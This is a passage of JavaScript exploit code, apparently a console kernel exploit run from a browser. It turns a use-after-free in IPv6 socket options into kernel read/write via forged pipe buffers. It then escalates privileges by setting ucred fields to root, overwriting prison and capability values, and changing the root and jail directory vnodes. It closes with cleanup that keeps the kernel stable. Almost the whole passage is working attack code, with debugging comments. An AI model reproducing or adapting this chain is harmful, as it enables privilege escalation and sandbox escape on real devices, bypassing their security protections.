                    + " e_machine=" + hx(got.getUint16(0x12, true)));
            } else check("kread_slow-returned-data", false, "");
        }

        let kv = null;
        if (kernelBase && triplets && kqFdp) {
            state("make_karw...", "warn");
            mark("SHORT-READS", "n=" + shortReads + " gate=" + (R2_ON ? 1 : 0));

            const KREAD_TRIES = params.has("kreadtries")
                ? parseInt(params.get("kreadtries"), 10) : 4;
            async function kread8(a) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "addr=" + a + " try=" + (t + 1));
                    const dv = await kreadSlow(a, 8);
                    if (dv) return new int64(dv.getUint32(0, true),
                                             dv.getUint32(4, true));
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }
            async function kwrite8n(dst, srcAddr, n) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KWRITE-RETRY", "dst=" + dst + " try=" + (t + 1));
                    if (await kwriteSlow(dst, srcAddr, n)) return true;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return false;
            }
            // R3/R4 helpers. Same retry discipline as kread8 -- do NOT drop it.
            const qw = (dv, o) => new int64(dv.getUint32(o, true),
                                            dv.getUint32(o + 4, true));
            async function kreadN(a, n) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "addr=" + a + " n=" + n
                        + " try=" + (t + 1));
                    const dv = await kreadSlow(a, n);
                    if (dv) return dv;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }
            // R4. One window, two non-adjacent addresses, via extra iovec slots
            // in the forged uio. poops.js:4909-4930 buildUioPairs / :4947-5010.
            async function kreadPairs(pairs) {
                let total = 0;
                for (const p2 of pairs) total += p2.size;
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "pairs=" + pairs.length
                        + " try=" + (t + 1));
                    const dv = await kreadSlow(null, total, pairs);
                    if (dv) return dv;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }
            const R3_ON = params.get("r3") !== "0";
            const R4_ON = params.get("r4") !== "0";

            const fdtOfiles = await kread8(kqFdp);
            mark("FDT-OFILES", "" + fdtOfiles);

            // R3. mFp and sFp are FILEDESCENT_SIZE apart in one live ofiles
            // span, so one 0x20 read replaces two windows. pipe() at :387/:389
            // are back-to-back with no intervening fd allocation, so the two
            // low fds are always 2 apart -- 44/44 in the log. Verified, not
            // assumed, and it falls back if the console ever disagrees.
            let mFp = null, sFp = null;
            const fdDelta = slavePipe[0] - masterPipe[0];
            const spanOk = R3_ON && fdtOfiles && fdDelta > 0
                && (fdDelta + 1) * FILEDESCENT_SIZE <= 0x20;
            if (spanOk) {
                const span = await kreadN(
                    fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE), 0x20);
                if (span) {
                    mFp = qw(span, 0);
                    sFp = qw(span, fdDelta * FILEDESCENT_SIZE);
                } else mark("PIPE-FP-SPAN-MISS", "delta=" + fdDelta);
            }
            if (!mFp && fdtOfiles && !kreadPoisoned && tripletsUsable()) {
                if (spanOk) mark("PIPE-FP-FALLBACK", "two single reads");
                mFp = await kread8(
                    fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
                sFp = await kread8(
                    fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
            }
            mark("PIPE-FP", "master=" + (mFp || "?") + " slave=" + (sFp || "?")
                + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));

            // R4. f_data of the two struct files: unrelated addresses, so a
            // contiguous read cannot help -- this needs the scatter.
            let mData = null, sData = null;
            if (R4_ON && mFp && sFp) {
                const both = await kreadPairs([{ addr: mFp, size: 8 },
                                               { addr: sFp, size: 8 }]);
                if (both) { mData = qw(both, 0); sData = qw(both, 8); }
                else mark("PIPE-FDATA-SCATTER-MISS", "");
            }
            if (!mData && !kreadPoisoned && tripletsUsable()) {
                if (R4_ON && mFp && sFp) mark("PIPE-FDATA-FALLBACK", "two reads");
                mData = mFp ? await kread8(mFp) : null;
                sData = sFp ? await kread8(sFp) : null;
            }
            mark("PIPE-FDATA", "master=" + (mData || "?") + " slave=" + (sData || "?"));
            const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;
            // R8. Two distinct struct files cannot share f_data. Equal values
            // mean the alias was misidentified, and aiming a pipebuf at itself
            // is not something that fails cleanly. POOPS.LUA:1068 aborts here.
            if (kptr(mData) && kptr(sData)
                && mData.low === sData.low && mData.hi === sData.hi) {
                check("pipe-fdata-distinct", false, "both=" + mData);
                mark("MAKE-KARW-ABORTED", "reason=mdata-equals-sdata");
                mData = null;
            }
            if (!check("ofiles-walk-reached-pipes",
                kptr(fdtOfiles) && kptr(mFp) && kptr(sFp)
                && kptr(mData) && kptr(sData), "")) {
                mark("MAKE-KARW-ABORTED", "reason=walk-not-kernel-pointers");
            } else {

                const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                keepAlive.push(pbAb);
                const pbAddr = bufAddr(pbAb), pbDv = new DataView(pbAb);
                new Uint8Array(pbAb).fill(0);
                pbDv.setUint32(0x0c, PIPE_PAGE, true);
                put(pbDv, 0x10, sData);
                mark("PIPEBUF-AIM", "at=" + mData + " size=0x"
                    + PIPE_PAGE.toString(16) + " buffer=" + sData);
                const wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
                check("pipebuf-written-master-struct-pipe", wrote, "");

                if (wrote) {
                    for (const fd of [masterPipe[0], masterPipe[1],
                                      slavePipe[0], slavePipe[1]])
                        sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
                    const kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                    const kvViewAb = new ArrayBuffer(0x40);
                    keepAlive.push(kvBufAb, kvViewAb);
                    const kvBufAddr = bufAddr(kvBufAb), kvBufDv = new DataView(kvBufAb);
                    const kvViewAddr = bufAddr(kvViewAb), kvViewDv = new DataView(kvViewAb);
                    new Uint8Array(kvBufAb).fill(0);
                    kvBufDv.setUint32(0x0c, PIPE_PAGE, true);
                    kv = {
                        flush: function () {
                            sc(SYS.write, masterPipe[1], kvBufAddr, PIPEBUF_SIZEOF);
                            sc(SYS.read, masterPipe[0], kvBufAddr, PIPEBUF_SIZEOF);
                        },
                        kread: function (dst, src, n) {
                            put(kvBufDv, 0x10, src);
                            kvBufDv.setUint32(0, n >>> 0, true);
                            this.flush();
                            return sc(SYS.read, slavePipe[0], dst, n).i32;
                        },
                        kwrite: function (dst, src, n) {
                            put(kvBufDv, 0x10, dst);
                            kvBufDv.setUint32(0, n >>> 0, true);
                            this.flush();
                            return sc(SYS.write, slavePipe[1], src, n).i32;
                        },
                        read8: function (a) {
                            new Uint8Array(kvViewAb).fill(0);
                            this.kread(kvViewAddr, a, 8);
                            return new int64(kvViewDv.getUint32(0, true),
                                             kvViewDv.getUint32(4, true));
                        },
                    };
                    mark("KERNELVIEW", "master=" + masterPipe + " slave=" + slavePipe);

                    new Uint8Array(kvViewAb).fill(0);
                    kv.kread(kvViewAddr, kernelBase, 0x10);
                    const hdr = [];
                    for (let i = 0; i < 16; ++i) hdr.push(kvViewDv.getUint8(i));
                    mark("KV-READ", "kernel_base -> "
                        + hdr.map(v => v.toString(16).padStart(2, "0")).join(" "));
                    const kvElfOk = check("kernelview-reads-kernel-elf-header",
                        kvViewDv.getUint32(0, true) === 0x464c457f, "");

                    const fpM2 = kv.read8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
                    const fpS2 = kv.read8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
                    const same = (a, b) => a && b
                        && (a.low >>> 0) === (b.low >>> 0)
                        && (a.hi >>> 0) === (b.hi >>> 0);
                    mark("KV-FGET", "master=" + fpM2 + " kread=" + mFp
                        + " slave=" + fpS2 + " kread=" + sFp);
                    const kvAgree = check("primitives-agree-pipes-struct-file",
                        same(fpM2, mFp) && same(fpS2, sFp), "");
                    if (!kvElfOk || !kvAgree) {
                        // REPORT ONLY. Do NOT null kv and do NOT skip what
                        // follows. By this point the pipebuf forge has already
                        // been committed, and the code below -- nulling the
                        // triplets' ip6po_rthdr and removing the aliased struct
                        // file -- is exactly what lets the process exit without
                        // panicking the kernel. Gating it on a failed view
                        // turns a run that would have finished dirty-but-alive
                        // into a guaranteed panic at exit. Four independent
                        // reviewers caught this; it was my mistake.
                        mark("KERNELVIEW-SUSPECT", "elf=" + (kvElfOk ? 1 : 0)
                            + " agree=" + (kvAgree ? 1 : 0)
                            + " -- repair still runs, later stages self-gate");
                    }

                    const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
                    const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
                    // dump scratch: kvwAb is only 0x10, and the pipebuf read
                    // needs 0x18. Separate buffers so the dump can never
                    // overflow the one the kview accessors use.
                    const dmpAb = new ArrayBuffer(0x20); keepAlive.push(dmpAb);
                    const dmpAddr = bufAddr(dmpAb), dmpDv = new DataView(dmpAb);
                    const dmpU8 = new Uint8Array(dmpAb);
                    const scanAbDump = new ArrayBuffer(0x80 * FILEDESCENT_SIZE);
                    keepAlive.push(scanAbDump);
                    const scanAddrDump = bufAddr(scanAbDump);
                    const scanDvDump = new DataView(scanAbDump);
                    function kview(base) {
                        return {
                            getBInt: function (o) {
                                return kv.read8(base.add32(o));
                            },
                            setBInt: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                put(kvwDv, 0, v);
                                kv.kwrite(base.add32(o), kvwAddr, 8);
                            },
                            getInt32: function (o) {
                                new Uint8Array(kvwAb).fill(0);
                                kv.kread(kvwAddr, base.add32(o), 4);
                                return kvwDv.getInt32(0, true);
                            },
                            setInt32: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                kvwDv.setInt32(0, v, true);
                                kv.kwrite(base.add32(o), kvwAddr, 4);
                            },
                            setUint8: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                kvwDv.setUint8(0, v);
                                kv.kwrite(base.add32(o), kvwAddr, 1);
                            },
                        };
                    }
                    const kptr2 = v => v && (v.hi >>> 0) >= 0xffff0000;
                    const fget = fd => kv.read8(
                        fdtOfiles.add32(fd * FILEDESCENT_SIZE));
                    function fput(fd, v) {
                        new Uint8Array(kvwAb).fill(0);
                        put(kvwDv, 0, v);
                        kv.kwrite(fdtOfiles.add32(fd * FILEDESCENT_SIZE), kvwAddr, 8);
                    }

                    function fhold(fp) {
                        const before = kview(fp).getInt32(0x28);
                        if (before <= 0 || before > 0xffff) return { before, after: before };
                        let after = before;
                        for (let bump = 1; bump <= 4; ++bump) {
                            kview(fp).setInt32(0x28, before + bump);
                            after = kview(fp).getInt32(0x28);
                            if (after > before && after >= 2) break;
                        }
                        return { before, after };
                    }
                    {
                        const held = [];
                        let allOk = true;
                        for (const fd of [masterPipe[0], masterPipe[1],
                                          slavePipe[0], slavePipe[1]]) {
                            const fp = fget(fd);
                            if (!kptr2(fp)) { allOk = false; held.push(fd + ":badfp"); continue; }
                            const r = fhold(fp);
                            if (!(r.after > r.before)) allOk = false;
                            held.push(fd + ":" + r.before + "->" + r.after);
                        }
                        mark("PIPE-REFCNT", held.join(" "));
                        check("four-karw-pipe-files-hold",
                            allOk, "");
                    }

                    // ITEM 1. Jailbreak BEFORE the teardown. The funnel was
                    // KERNELVIEW 44 -> CURPROC 38: six runs had working
                    // kernel R/W and died in cleanup without ever trying.
                    // Everything below needs only kv, fdtOfiles and sc, all
                    // live from here. poops.js:7273 orders it the same way.
                    //
                    // WRAPPED, and it has to be: running before the cleanup
                    // means a throw in here would skip the socket close and
                    // the alias repair and leave the console dirty. Running
                    // last, it never could.
                    let jailbreakThrew = null;
                    // Declared OUT here: the kernel patcher and the
                    // payload stage read both, and a let inside the try
                    // below would be block-scoped away from them --
                    // a runtime ReferenceError node --check cannot see.
                    let jailbroken = false, curproc = null;
                    try {
                        const FIOSETOWN = 0x8004667c;
                        const P_LIST_NEXT = 0x00, P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
                        const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
                        const CR_NGROUPS = 0x10, CR_RGID = 0x14;
                        const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                        const FD_RDIR = 0x10, FD_JDIR = 0x18;
                        state("sandbox escape...", "warn");
                        {
                            if (sc(SYS.pipe, argAddr).i32 !== -1) {
                                const escPipe = [argDv.getInt32(0, true),
                                                 argDv.getInt32(4, true)];
                                lenDv.setUint32(0, pid, true);
                                sc(SYS.ioctl, escPipe[0], FIOSETOWN, lenAddr);
                                const escFp = fget(escPipe[0]);
                                const escData = kptr2(escFp) ? kv.read8(escFp) : null;
                                const sigio = kptr2(escData)
                                    ? kv.read8(escData.add32(0xd0)) : null;
                                curproc = kptr2(sigio) ? kv.read8(sigio) : null;
                                sc(SYS.close, escPipe[1]);
                                sc(SYS.close, escPipe[0]);
                            }
                            mark("CURPROC", "" + (curproc || "null"));
                            check("curproc-resolved-through-pipe-sigio",
                                kptr2(curproc), "" + (curproc || "null"));
                        }
                        if (kptr2(curproc)) {

                            function pfind(target) {
                                let q = kv.read8(curproc);
                                for (let n = 0; n < 4096; ++n) {
                                    if (!kptr2(q)) return null;
                                    if (kview(q).getInt32(P_PID) === target) return q;
                                    q = kv.read8(q.add32(P_LIST_NEXT));
                                }
                                return null;
                            }
                            const kProc = pfind(0);
                            const procFd = kv.read8(curproc.add32(P_FD));
                            const ucred = kv.read8(curproc.add32(P_UCRED));
                            mark("JAILBREAK-SOURCES", "kproc=" + (kProc || "null")
                                + " p_fd=" + procFd + " p_ucred=" + ucred);
                            const prison0 = kptr2(kProc)
                                ? kv.read8(kv.read8(kProc.add32(P_UCRED)).add32(CR_PRISON))
                                : null;
                            const rootVnode = kptr2(kProc)
                                ? kv.read8(kv.read8(kProc.add32(P_FD)).add32(FD_RDIR))
                                : null;
                            const srcOk = kptr2(procFd) && kptr2(ucred)
                                && kptr2(prison0) && kptr2(rootVnode);
                            mark("JAILBREAK-KSRC", "prison0=" + (prison0 || "null")
                                + " rootvnode=" + (rootVnode || "null"));
                            if (check("jailbreak-source-kernel-pointer",
                                srcOk, srcOk ? "" : "refusing to write")) {
                                kview(ucred).setInt32(CR_UID, 0);
                                kview(ucred).setInt32(CR_RUID, 0);
                                kview(ucred).setInt32(CR_SVUID, 0);
                                kview(ucred).setInt32(CR_NGROUPS, 1);
                                kview(ucred).setInt32(CR_RGID, 0);
                                kview(ucred).setBInt(CR_PRISON, prison0);
                                kview(ucred).setBInt(CR_SCECAPS1, new int64(-1, -1));
                                kview(ucred).setBInt(CR_SCECAPS0, new int64(-1, -1));
                                kview(procFd).setBInt(FD_RDIR, rootVnode);
                                kview(procFd).setBInt(FD_JDIR, rootVnode);
                                const uidNow = sc(SYS.getuid).i32;
                                jailbroken = uidNow === 0;
                                mark("JAILBROKEN", "uid=" + uidNow
                                    + " prison0=" + kview(ucred).getBInt(CR_PRISON)
                                    + " fd_rdir=" + kview(procFd).getBInt(FD_RDIR));
                                check("kernel-reports-root",
                                    jailbroken, "getuid=" + uidNow);
                            }
                        }
                    } catch (e) {
                        jailbreakThrew = e && e.message ? e.message : "" + e;
                        mark("JAILBREAK-THREW", jailbreakThrew
                            + " -- continuing to cleanup");
                    }


                    // Addresses captured during the repair so the end-of-run
                    // dump can re-read them once the sockets are closed.
                    const dumpOpts = [];
                    function removeRthdrFromSocket(fd) {
                        const fp = fget(fd);
                        if (!kptr2(fp)) return "badfp";
                        const fData = kv.read8(fp);
                        if (!kptr2(fData)) return "badfdata";
                        const soPcb = kv.read8(fData.add32(0x18));
                        if (!kptr2(soPcb)) return "badpcb";
                        const opts = kv.read8(soPcb.add32(0x118));
                        if (kptr2(opts)) dumpOpts.push({ fd: fd, opts: opts });
                        if (!kptr2(opts)) return "noopts";
                        // ITEM 4. Read it, write it, READ IT BACK. This is the
                        // single write that decides whether the process can exit
                        // without panicking, and until now nothing anywhere in
                        // the chain has ever confirmed that a kv write actually
                        // lands -- the check below reported "nulled" purely
                        // because the four reads above looked pointer-shaped.
                        // poops.js:7123-7128 reads back the same way.
                        const was = kview(opts).getBInt(0x68);
                        kview(opts).setBInt(0x68, new int64(0, 0));
                        const now = kview(opts).getBInt(0x68);
                        if (!now || (now.low >>> 0) !== 0 || (now.hi >>> 0) !== 0) {
                            mark("RTHDR-NULL-FAILED", "fd=" + fd + " opts=" + opts
                                + " was=" + was + " still=" + now);
                            return "writefail";
                        }
                        return was && ((was.low >>> 0) || (was.hi >>> 0))
                            ? "nulled" : "already0";
                    }
                    {
                        const res = triplets.map(fd => fd + ":" + removeRthdrFromSocket(fd));
                        mark("TRIPLET-RTHDR", res.join(" "));
                        // "already0" is a success: the field was already clear,
                        // so there is nothing to repair. Only a failed WRITE or
                        // a bad walk is a failure -- and unlike before, this now
                        // reflects a verified read-back rather than the shape of
                        // the pointers we walked to get here.
                        check("triplet-ip6po_rthdr-nulled",
                            res.every(r => r.endsWith("nulled")
                                        || r.endsWith("already0")),
                            res.join(" "));
                    }

                    // ITEM 6(c). The half that makes the retry safe. Every socket
                    // burned during a failed attempt still has an rthdr pointing
                    // at a freed ucred; closing it would free that chunk again.
                    // Now that kernel R/W exists, null the pointer -- verified by
                    // read-back -- and only then let it out of the burn list.
                    // Anything that will not repair STAYS burned and stays open.
                    if (burned.size) {
                        const bres = [], cleared = [];
                        for (const fd of burned) {
                            const r = removeRthdrFromSocket(fd);
                            bres.push(fd + ":" + r);
                            if (r === "nulled" || r === "already0") cleared.push(fd);
                        }
                        for (const fd of cleared) burned.delete(fd);
                        mark("BURNED-REPAIRED", bres.join(" ")
                            + "  still_burned=" + burned.size);
                        check("burned-sockets-repaired", burned.size === 0,
                            burned.size ? [...burned].join(",") : "");
                        if (burned.size) rebootRequired = true;
                    }

                    state("remove_uaf_file...", "warn");
                    const uafFp = fget(uafSock);
                    uafFpSaved = uafFp;
                    mark("UAF-FP", "fd=" + uafSock + " fp=" + uafFp);
                    if (kptr2(uafFp)) {

                        const r = fhold(uafFp);

                        // THIS LOOP WAS KILLING 22% OF THE RUNS THAT REACHED IT.
                        // 2048 x fget(), and every fget minted TWO int64 -- and
                        // int64.js gives each instance its own seven closures
                        // (int64.js:19-93), so 8 GC cells apiece -- plus a
                        // per-call Uint8Array inside kv.read8, plus two pipe
                        // syscalls. 34,816 objects and 4,096 syscalls in one
                        // unbroken synchronous stretch, at the point the heap is
                        // most loaded, with no yield anywhere in it. JSC's
                        // sweeper only runs when the event loop turns, so all of
                        // that garbage sat unswept until the await immediately
                        // after SOCKETS-CLOSED -- which is exactly where the
                        // process was being killed.
                        //
                        // Same range, same comparisons, same writes. The ofiles
                        // array is just read in bulk and scanned as raw words in
                        // the DataView: no int64, no typed array, no per-fd
                        // syscall. Two syscalls per 512 fds instead of 1024.
                        // Cleanup runs ~500 ms after the race, so the yields are
                        // free here.
                        // BOUNDED. This scan used to run to 0x800 with nothing
                        // proving the ofiles array is that big. If the table is
                        // smaller, the bulk read walks past the allocation and
                        // any 8 bytes out there that happen to equal uafFp get
                        // ZEROED by the fput below -- an out-of-bounds kernel
                        // write whose damage surfaces at the NEXT allocation,
                        // which is exactly the window where 22% of the runs
                        // reaching here died. POOPS.LUA:1219 scans only 0..255;
                        // we were eight times wider with no bound at all.
                        //
                        // Bound it by the highest fd we can PROVE is open,
                        // because we are holding it -- the table must have at
                        // least that many entries, and FreeBSD never shrinks it
                        // on close. No fd_nfiles offset to get wrong. The
                        // highest alias ever observed across 71 logged runs is
                        // 273, and our own sockets run past that.
                        let maxHeld = 0;
                        for (const fd of ipv6) if (fd > maxHeld) maxHeld = fd;
                        for (const fd of [masterPipe[0], masterPipe[1],
                                          slavePipe[0], slavePipe[1],
                                          iovSs[0], iovSs[1], uioSs[0], uioSs[1],
                                          uafSock])
                            if (fd > maxHeld) maxHeld = fd;
                        const SCAN_MAX = Math.min(0x800, maxHeld + 1);
                        mark("UAF-SCAN-BOUND", "max_held_fd=" + maxHeld
                            + " scan_max=" + SCAN_MAX + " was=2048");
                        // CLAMPED, and it has to be. This value is the loop
                        // INCREMENT at the bottom of this block, not a bound, so
                        // unlike every other knob in this file a bad value does
                        // not degrade to "do nothing" -- it never terminates.
                        // parseInt("0x200", 10) is 0 (it stops at the x), and
                        // 0x200 is exactly how the default is spelled right
                        // here, so that is the value someone is most likely to
                        // paste in. A non-terminating loop here awaits a 0 ms
                        // timer forever: the finally never runs, the main thread
                        // stays realtime-pinned, the freed file stays aliased,
                        // and the console needs a hard power-off.
                        // Upper bound: CHUNK_BYTES must stay strictly under
                        // PIPE_PAGE, or pipe_read wraps its buffer and hands
                        // back DUPLICATED data that still passes the
                        // rv === CHUNK_BYTES check -- which would make fput()
                        // write zeros far past the end of the fd table.
                        const CHUNK_FDS = (function () {
                            const cap = (PIPE_PAGE / FILEDESCENT_SIZE) >> 1;
                            const n = params.has("scanchunk")
                                ? parseInt(params.get("scanchunk"), 10) : 0x200;
                            if ((n | 0) === n && n >= 1 && n <= cap) return n;
                            if (params.has("scanchunk"))
                                mark("SCANCHUNK-CLAMPED", "given="
                                    + params.get("scanchunk") + " cap=" + cap
                                    + " using=0x200");
                            return 0x200;
                        })();
                        const CHUNK_BYTES = CHUNK_FDS * FILEDESCENT_SIZE;
                        const scanAb = new ArrayBuffer(CHUNK_BYTES);
                        keepAlive.push(scanAb);   // its address goes to the kernel
                        const scanAddr = bufAddr(scanAb);
                        const scanDv = new DataView(scanAb);
                        const wantLo = uafFp.low >>> 0, wantHi = uafFp.hi >>> 0;
                        let nulled = 0, bulkChunks = 0, slowChunks = 0;
                        const fds = [];
                        for (let base = 0; base < SCAN_MAX; base += CHUNK_FDS) {
                            // Clamp the LAST chunk. SCAN_MAX is now a measured
                            // bound, not a round number, so a fixed-size read
                            // here would walk past the table on the final chunk
                            // -- reintroducing the exact out-of-bounds this
                            // bound exists to prevent.
                            const nFds = Math.min(CHUNK_FDS, SCAN_MAX - base);
                            const nBytes = nFds * FILEDESCENT_SIZE;
                            const rv = kv.kread(scanAddr,
                                fdtOfiles.add32(base * FILEDESCENT_SIZE),
                                nBytes);
                            if (rv === nBytes) {
                                bulkChunks++;
                                for (let i = 0; i < nFds; ++i) {
                                    const o = i * FILEDESCENT_SIZE;
                                    if (scanDv.getUint32(o, true) === wantLo
                                        && scanDv.getUint32(o + 4, true) === wantHi) {
                                        const fd = base + i;
                                        fput(fd, new int64(0, 0));
                                        nulled++; fds.push(fd);
                                    }
                                }
                            } else {
                                // Short read: redo THIS CHUNK the original way.
                                // Never skip one -- a missed alias leaves the
                                // console dirty and costs a reboot, which is far
                                // worse than the allocation we are avoiding.
                                slowChunks++;
                                for (let i = 0; i < nFds; ++i) {
                                    const fd = base + i;
                                    if (same(fget(fd), uafFp)) {
                                        fput(fd, new int64(0, 0));
                                        nulled++; fds.push(fd);
                                    }
                                }
                            }
                            // Let the sweeper run. This is the whole point.
                            await new Promise(done => setTimeout(done, 0));
                        }
                        mark("UAF-SCAN", "chunks=" + CHUNK_FDS + "fd bulk="
                            + bulkChunks + " fellback=" + slowChunks
                            + " syscalls=" + (bulkChunks * 2 + slowChunks * CHUNK_FDS * 2));
                        uafSock = 0;

                        // ================== P1: DRAIN THE FILE ZONE ==================
                        // MEASURED, not assumed. A 256-allocation probe returned
                        // the SAME struct file at three consecutive fds
                        // (364,365,366): the chunk is linked into the Files zone
                        // free list THREE times -- freed 3x (CLEAR_QUEUE and two
                        // dup+close) but allocated once -- so falloc hands the
                        // identical object to three independent owners. The first
                        // to close it frees it; the other two dangle. That is the
                        // panic minutes after an idle run.
                        //
                        // The fd-table scan above cannot see this: a free-list
                        // entry is in no fd table. Pull the duplicates out by
                        // allocating until they surface (~1032 deep, stride 0x68).
                        //
                        // NULL the slot; do NOT leak the fd. f_count reads 1, not
                        // 3 -- each falloc resets it -- so three descriptors point
                        // at an object whose refcount says one, and leaking them
                        // only moves the panic to fdescfree at process exit.
                        // Nulling means nothing references it and it is orphaned
                        // for good. netctrl_c0w_twins.ts:1332 nulls before close
                        // for exactly this reason.
                        const DRAIN_CAP = (function () {
                            const n = params.has("drain")
                                ? parseInt(params.get("drain"), 10) : 1536;
                            return ((n | 0) === n && n >= 0 && n <= 8192) ? n : 1536;
                        })();
                        const DRAIN_EXPECT = 3, DRAIN_BATCH = 128;
                        // Visible to the `clean` decision below. Default true so
                        // that ?drain=0 does not by itself condemn the run.
                        let zoneClean = true;
                        if (DRAIN_CAP > 0) {
                            const dAb = new ArrayBuffer(DRAIN_BATCH * FILEDESCENT_SIZE);
                            keepAlive.push(dAb);
                            const dAddr = bufAddr(dAb), dDv = new DataView(dAb);
                            const oneAb = new ArrayBuffer(8); keepAlive.push(oneAb);
                            const oneAddr = bufAddr(oneAb), oneDv = new DataView(oneAb);
                            const wLo = uafFp.low >>> 0, wHi = uafFp.hi >>> 0;
                            const held = [], hitFds = [];
                            let scanned = 0, batches = 0, moved = 0, emfile = false;
                            // The fd table REALLOCATES as it grows, so the cached
                            // fdtOfiles goes stale mid-drain and both fget and fput
                            // would then touch freed memory. Re-read it each batch
                            // and use the fresh pointer for reads AND writes.
                            let ofl = fdtOfiles;
                            const dl = Date.now() + 15000;
                            while (scanned < DRAIN_CAP && hitFds.length < DRAIN_EXPECT
                                   && Date.now() < dl) {
                                const batch = [];
                                for (let i = 0; i < DRAIN_BATCH && scanned < DRAIN_CAP; ++i) {
                                    const fd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                                    if (fd === -1) { emfile = true; break; }
                                    batch.push(fd); held.push(fd); scanned++;
                                }
                                if (!batch.length) break;
                                batches++;
                                const fresh = kv.read8(kqFdp);
                                if (kptr2(fresh) && !(fresh.low === ofl.low
                                                   && fresh.hi === ofl.hi)) {
                                    ofl = fresh; moved++;
                                }
                                const lo = batch[0], hi = batch[batch.length - 1];
                                const span = (hi - lo + 1) * FILEDESCENT_SIZE;
                                let bulk = false;
                                if (span > 0 && span <= dAb.byteLength) {
                                    bulk = kv.kread(dAddr,
                                        ofl.add32(lo * FILEDESCENT_SIZE), span) === span;
                                }
                                for (const fd of batch) {
                                    let flo, fhi;
                                    if (bulk) {
                                        const o = (fd - lo) * FILEDESCENT_SIZE;
                                        flo = dDv.getUint32(o, true) >>> 0;
                                        fhi = dDv.getUint32(o + 4, true) >>> 0;
                                    } else {
                                        if (kv.kread(oneAddr,
                                            ofl.add32(fd * FILEDESCENT_SIZE), 8) !== 8)
                                            continue;
                                        flo = oneDv.getUint32(0, true) >>> 0;
                                        fhi = oneDv.getUint32(4, true) >>> 0;
                                    }
                                    if (flo === wLo && fhi === wHi) hitFds.push(fd);
                                }
                                await new Promise(done => setTimeout(done, 0));
                            }
                            // NULL every hit through the CURRENT ofiles, then close.
                            // close() on a nulled slot is a no-op, so nothing frees.
                            let nulledHits = 0;
                            for (const fd of hitFds) {
                                oneDv.setUint32(0, 0, true); oneDv.setUint32(4, 0, true);
                                kv.kwrite(ofl.add32(fd * FILEDESCENT_SIZE), oneAddr, 8);
                                if (kv.kread(oneAddr,
                                        ofl.add32(fd * FILEDESCENT_SIZE), 8) === 8
                                    && oneDv.getUint32(0, true) === 0
                                    && oneDv.getUint32(4, true) === 0) nulledHits++;
                                sc(SYS.close, fd);
                            }
                            for (const fd of held)
                                if (hitFds.indexOf(fd) < 0) sc(SYS.close, fd);
                            mark("ZONE-DRAIN", "scanned=" + scanned + "/" + DRAIN_CAP
                                + " batches=" + batches
                                + " hits=" + hitFds.length + "/" + DRAIN_EXPECT
                                + (hitFds.length ? " at_fds=" + hitFds.join(",") : "")
                                + " nulled=" + nulledHits
                                + " ofiles_moved=" + moved
                                + (emfile ? " EMFILE" : ""));
                            check("file-zone-duplicates-drained",
                                hitFds.length === DRAIN_EXPECT
                                && nulledHits === hitFds.length,
                                "found " + hitFds.length + " of " + DRAIN_EXPECT
                                + ", nulled " + nulledHits);
                            if (hitFds.length !== DRAIN_EXPECT
                                || nulledHits !== hitFds.length) {
                                rebootRequired = true; zoneClean = false;
                            }

                            // Independent verification: fresh allocations must no
                            // longer be handed the chunk. This is the measurement
                            // that says the console is actually clean.
                            const vfds = [];
                            let vhits = 0;
                            for (let i = 0; i < 16; ++i) {
                                const fd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                                if (fd === -1) break;
                                vfds.push(fd);
                            }
                            const vres = kv.read8(kqFdp);
                            const vofl = kptr2(vres) ? vres : ofl;
                            for (const fd of vfds) {
                                if (kv.kread(oneAddr,
                                        vofl.add32(fd * FILEDESCENT_SIZE), 8) !== 8) {
                                    sc(SYS.close, fd); continue;
                                }
                                if ((oneDv.getUint32(0, true) >>> 0) === wLo
                                    && (oneDv.getUint32(4, true) >>> 0) === wHi) {
                                    vhits++;
                                    oneDv.setUint32(0, 0, true);
                                    oneDv.setUint32(4, 0, true);
                                    kv.kwrite(vofl.add32(fd * FILEDESCENT_SIZE),
                                        oneAddr, 8);
                                }
                                sc(SYS.close, fd);
                            }
                            mark("ZONE-VERIFY", "alloc=" + vfds.length
                                + " residual_hits=" + vhits);
                            check("freed-file-not-reissued-by-falloc", vhits === 0,
                                vhits ? "still reissued after the drain" : "");
                            if (vhits) { rebootRequired = true; zoneClean = false; }
                        }
                        // ================ END P1: DRAIN THE FILE ZONE ================


                        mark("UAF-REMOVED", "fhold=" + r.before + "->" + r.after
                            + " nulled=" + nulled + "/" + SCAN_MAX
                            + " fds=" + fds.join(","));
                        // `nulled > 0` only ever proved the LIVE FD TABLE was
                        // tidy. It is structurally blind to a free-list entry,
                        // and every "clean" run we celebrated was reporting on
                        // that blind evidence -- which is why the console kept
